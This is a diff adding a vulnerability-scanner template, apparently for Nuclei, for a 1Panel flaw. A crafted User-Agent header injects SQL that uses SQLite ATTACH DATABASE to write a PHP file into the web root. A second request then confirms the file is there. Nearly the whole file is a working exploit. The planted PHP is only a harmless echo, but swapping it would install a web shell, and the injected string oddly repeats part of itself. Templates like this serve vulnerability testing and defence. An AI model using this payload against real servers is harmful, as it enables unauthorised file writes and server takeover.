@@ -1,0 +1,34 @@
+id: 1panel-user-agent-file-write
+
+info:
+  name: 1Panel User-Agent 字段远程文件写入漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    1Panel 是一款基于 Linux 服务器的综合运维管理平台，提供图形化界面用于主机监控、文件管理、数据库及容器操作。系统深度集成 WordPress 和 Halo 等开源建站解决方案。
+
+    通过恶意构造 User-Agent 请求头，攻击者可实现任意文件写入操作，从而获取服务器写入权限。
+
+  tags: 1Panel
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    GET / HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: ua', 'NTest.cn', 5201314, '', '', 1, '2024-06-09 08:16:52', 1817921010.847, '/AAAAAAA', 52014, '2025-06-09', '16', '', '', 'Linux', 'edge', 'pc', '', '');ATTACH DATABASE '/www/sites/index/index/NTest.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('User-Agent: ua', 'NTest.cn', 5201314, '', '', 1, '2024-06-09 08:16:52', 1817921010.847, '/AAAAAAA', 52014, '2025-06-09', '16', '', '', 'Linux', 'edge', 'pc', '', '');ATTACH DATABASE '/www/sites/index/index/NTest.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?php echo "NdayTest";?>');#');#
+- raw:
+  - |
+    GET /NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
